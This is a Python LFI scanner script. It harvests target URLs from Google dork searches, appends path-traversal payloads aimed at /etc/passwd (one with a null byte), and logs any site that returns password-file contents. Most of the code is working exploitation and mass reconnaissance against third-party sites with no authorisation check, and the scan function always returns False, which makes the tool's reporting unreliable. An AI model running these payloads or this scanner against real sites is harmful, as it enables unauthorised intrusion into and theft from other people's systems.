import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote, urlparse
from colorama import Fore, Style
import time
import os
import re
import entery
import urllib

def is_valid_url(url):
    """
    Validates a URL, ensuring it has the correct structure and format.
    It also handles edge cases like too many dots or missing schemes.
    """
    try:
        # First, attempt to parse the URL with urllib
        result = urlparse(url)

        # If there's no scheme, prepend 'http://' by default
        if not result.scheme:
            url = 'http://' + url
            result = urlparse(url)

        # Validate URL using regex (to handle edge cases like 'migrate.supabase.com..')
        # This is a simple but effective regex for URL structure.
        regex = re.compile(
            r'^(?:http|ftp)s?://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)

        # Return True if the regex matches and URL has both scheme and netloc
        return re.match(regex, url) is not None and all([result.scheme, result.netloc])

    except Exception as e:
        # If parsing or validation fails, log the error for debugging and return False
        print(Fore.RED + f"[!] URL Validation error: {str(e)}")
        return False

class LFIScanner:
    def __init__(self):
        self.lfi_payloads = ["../../../../../../../../../../../etc/passwd",
                         "../../../../../../../../../../../etc/passwd",
                         "/..././..././..././..././..././..././..././etc/passwd%00",
                         "../../../../../../../..//etc/passwd"]

    def google_lfi(self, num_results: int):
        search_engine = "https://www.google.com/search"
        with open("lfi.txt", "r") as f:
            dorks = f.readlines()
        for dork in dorks:
            dork = dork.strip()
            url = f"{search_engine}?q={dork}&num={num_results}"
            try:
                response = requests.get(url, timeout=5)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)
                continue
            soup = BeautifulSoup(response.text, "html.parser")
            results = soup.find_all("a")
            urls = []
            for result in results:
                href = result.get("href")
                if href.startswith("/url?q="):
                    url = href[7:].split("&")[0]
                    url = unquote(url)
                    urls.append(url)
            for url in urls:
                for payload in self.lfi_payloads:
                    target_url = f"{url}{payload}"
                    try:
                        response = requests.get(target_url, timeout=5)
                        if "root:x:" in response.text:
                            print(
                                Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability found at " + Fore.RED
                                + Style.BRIGHT + f"{target_url}" + Style.RESET_ALL)
                            with open("google_lfi_results.txt", "a") as f:
                                f.write(f"{target_url}\n")
                                print(Fore.MAGENTA + Style.BRIGHT +"Vulnerability Urls saved in google_lfi_results.txt file...")
                        else:
                            print(
                                Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT + f"{target_url}" + Fore.YELLOW + " is not vulnerable to LFI")
                    except requests.exceptions.RequestException as e:
                        print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)
                        continue

    def check_lfi(self, url):
        for payload in self.lfi_payloads:
            r = requests.get(url + payload, timeout=5)
            if "root:x" in r.text:
                print(Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT +"LFI vulnerability found at %s%s" % (url, payload))
            else:
                print(Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT +"LFI is not found at %s%s" % (url, payload))
        return False

    def run(self):
        while True:
            a = input(Fore.YELLOW + Style.BRIGHT + "\t>>> Scan LFI with dork click 1 : \n" + Fore.BLUE + Style.BRIGHT + "\t>>> "
            "Scan"
            " LFI "
            "in "
            "target url click 2 : \n" + Fore.MAGENTA + Style.BRIGHT + "\t>>> For Quit click 0 : \n" + Fore.CYAN + Style.BRIGHT + "\t>>>")
            if a == "1":
                take_number = input(Fore.BLUE + Style.BRIGHT + "<Example Result Number: 10>" + Fore.MAGENTA + Style.BRIGHT + "\nEnter "
                "The "
                "Number "
                "Of "
                "Search "
                "Results: ")
                self.google_lfi(take_number)
                print(Fore.GREEN + Style.BRIGHT + "Search finished.")
            elif a == "2":
                try:
                    url_list_path = input(Fore.MAGENTA + "<You can be add in url.txt>\n" + Fore.CYAN + "Enter the full path to the URL list file: ")
                    
                    # Check if the file exists before opening it
                    if not os.path.isfile(url_list_path):
                        print(Fore.RED + "Error: The file '%s' was not found. Please check the path and try again." % url_list_path)
                        continue

                    # Open the file
                    with open(url_list_path, 'r') as f:
                        urls = f.readlines()

                    # Process the URLs and scan for LFI
                    for url in urls:
                        url = url.strip()

                        # Valideate the URL before proceeding
                        if not is_valid_url(url):
                            print(Fore.YELLOW + "Skipping invalid URL: '%s'" % url)
                            continue # Skip any invalid URL to prevent issues

                        print(Fore.GREEN + "Scanning %s for LFI vulnerability..." % url)

                        try:
                            if self.check_lfi(url):
                                print(Fore.GREEN + "LFI vulnerability found at %s" % url)
                            else:
                                print(Fore.BLUE + "LFI is not found at %s" % url)
                        except Exception as scan_error:
                            print(Fore.RED + f"[!] Error while scanning URL: {url}. Error: {str(scan_error)}")
                            continue # Continue to the next URL even if an error occurs

                    print(Fore.GREEN + "Scan finished.")
                    
                except FileNotFoundError:
                    print(Fore.RED + "Error: The file '%s' was not found. Please double-check the file path." % url_list_path)
                except Exception as e:
                    print(Fore.RED + "An error occurred: %s" % str(e))
                    continue
            elif a == "0":
                print(Fore.CYAN + Style.BRIGHT + "Quitting...")
                break
            else:
                print(Fore.RED + Style.BRIGHT + "Please Choose 1 or 2 !?")
                input(Fore.YELLOW + Style.BRIGHT + "Press enter to continue...")


if __name__ == "__main__":
    entery.entryy()
    scanner = LFIScanner()
    scanner.run()
